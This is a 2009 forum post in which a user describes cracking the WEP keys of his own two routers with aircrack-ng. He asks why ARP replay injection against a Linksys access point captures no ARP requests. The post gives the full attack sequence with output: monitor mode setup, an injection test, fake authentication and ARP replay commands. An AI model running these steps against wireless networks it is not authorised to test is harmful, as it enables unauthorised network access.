---
title: "arp reply problem"
date: 2009-02-22
forum: Security
---

### Post by gimpchop on 2009-02-22
hi guys this is my first post. i have been searching for ages for the awnser but with no luck so any input would be great.
here is my prob.

It is abit of a long winded explanation but i wanted to give as much ifo as pos thanks for your time.

ive been useing aircrack to test the strength of my wep.
i have 2 routers that ive been trying to crack
1 is a bthomehub and the other is a linksys.
I also have been useing 2 laptops 1 with a broadcom using b43 driver and 1 atheros card with the a5k madwifi driver
both using chaoxcd-2009-02-09-13-26 live cd.

Now when i try to crack the homehub everything works fine and i can obtain the key within a few mins on any of the comps but the linksys is proveing more difficult. 
This is how i go about it for both aps

ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up

airmon-ng start wlan0

Found 3 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID	Name
5152	NetworkManager
5155	wpa_supplicant
5313	dhcpcd
Process with PID 5313 (dhcpcd) is running on interface wlan0

interface	Chipset		Driver
wlan0		Broadcom	b43 - [phy0]
				(monitor mode enabled on mon0)


aireplay-ng -9 wlan0
13:15:27  Trying broadcast probe requests...
13:15:27  Injection is working!
13:15:29  Found 3 APs

13:15:29  Trying directed probe requests...
13:15:29   00:00:00:00:00:00 - channel: 11 - 'piratenet'
13:15:30  Ping (min/avg/max): 2.091ms/36.021ms/60.563ms Power: -53.73
13:15:30  30/30: 100%

13:15:30  00:00:00:00:00:00 - channel: 11 - 'linksys'
13:15:31  Ping (min/avg/max): 19.607ms/44.248ms/63.032ms Power: -39.30
13:15:31  30/30: 100%

then i run fake authentication 
vecd@chaox ~ $ sudo aireplay-ng -1 6000 -o 1 -q10 -e linksys -a 00:00:00:00:00:00 -h 00:00:00:00:00:00 mon0
13:23:59  Waiting for beacon frame (BSSID: 00:14:BF:D7:F4:98) on channel 11

13:23:59  Sending Authentication Request (Open System) [ACK]
13:23:59  Authentication successful
13:23:59  Sending Association Request [ACK]
13:23:59  Association successful :-) (AID: 1)
13:24:09  Sending keep-alive packet [ACK]
13:24:19  Sending keep-alive packet [ACK]
13:24:29  Sending keep-alive packet [ACK]
13:24:39  Sending keep-alive packet [ACK]

next i try injecting packets with
 
sudo aireplay-ng -3 -b 00:00:00:00:00:00 -h 00:00:00:00:00:00 mon0
13:27:51  Waiting for beacon frame (BSSID: 00:00:00:00:00:00) on channel 11
Saving ARP requests in replay_arp-0222-132751.cap
You should also start airodump-ng to capture replies.
Read 6093 packets (got 0 ARP requests and 8 ACKs), sent 0 packets...(0 pps)

but here is where it fails
Notice i get read packets all ok but arp requests is 0 and acks 8 this is what i dont understand and the colected packets in airodump dont go up as fast as they should.

---

